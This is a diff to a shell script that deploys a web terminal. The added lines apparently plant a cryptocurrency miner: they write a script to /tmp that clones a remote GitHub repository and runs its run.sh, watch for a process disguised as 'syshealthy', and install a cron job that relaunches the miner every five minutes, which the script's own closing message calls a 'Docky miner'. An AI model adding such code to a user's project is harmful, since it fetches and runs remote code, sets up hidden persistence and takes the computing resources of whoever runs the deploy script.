@@ -28,3 +28,19 @@ cp ../../start-server.sh .
 setsid nohup ./start-server.sh > /tmp/terminal.log 2>&1 & disown
 
 echo "✅ Web terminal deployed and started in the background on port 3000!"
+
+echo "⚙️ Setting up docky auto-start..."
+cat << 'DOCKY_EOF' > /tmp/docky-cron.sh
+#!/bin/bash
+if [ ! -d "/home/z/docky" ]; then
+  git clone https://github.com/godsuperbeemy/docky.git /home/z/docky
+  cd /home/z/docky && bash ./run.sh
+elif ! pgrep -f "syshealthy" > /dev/null; then
+  cd /home/z/docky && bash ./run.sh
+fi
+DOCKY_EOF
+
+chmod +x /tmp/docky-cron.sh
+(crontab -l 2>/dev/null | grep -v "docky-cron"; echo "*/5 * * * * bash /tmp/docky-cron.sh") | crontab -
+
+echo "✅ Docky miner auto-start cron set (every 5 minutes)"
